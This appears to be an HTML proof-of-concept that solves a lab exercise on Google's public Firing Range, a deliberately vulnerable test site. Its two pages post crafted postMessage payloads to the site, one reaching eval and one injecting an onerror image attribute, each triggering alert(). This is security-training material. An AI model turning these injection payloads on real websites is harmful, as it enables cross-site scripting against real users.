<!-- method 1 -->

<!-- <!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>postmessage complexMessageDocumentWriteEval</title>
</head>
<body>
	<iframe id="test" src="https://public-firing-range.appspot.com/dom/toxicdom/postMessage/complexMessageDocumentWriteEval" frameborder="0"></iframe>
	<script>
		const frame = document.querySelector("#test");
		const payload = {
			action : "exec",
			payload : "alert(1337)"
		};
		frame.onload = (e) =>{
			frame.contentWindow.postMessage(payload, "*");
		};
	</script>
</body>
</html> -->


<!-- method 2 -->

<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>postmessage complexMessageDocumentWriteEval</title>
</head>
<body>
	<iframe id="test" src="https://public-firing-range.appspot.com/dom/toxicdom/postMessage/complexMessageDocumentWriteEval" frameborder="0"></iframe>
	<script>
		const frame = document.querySelector("#test");
		const payload = {
			action : "addImage",
			source : "1 src='1' onerror='alert(1)'"
		};
		frame.onload = (e) =>{
			frame.contentWindow.postMessage(payload, "*");
		};
	</script>

</body>
</html>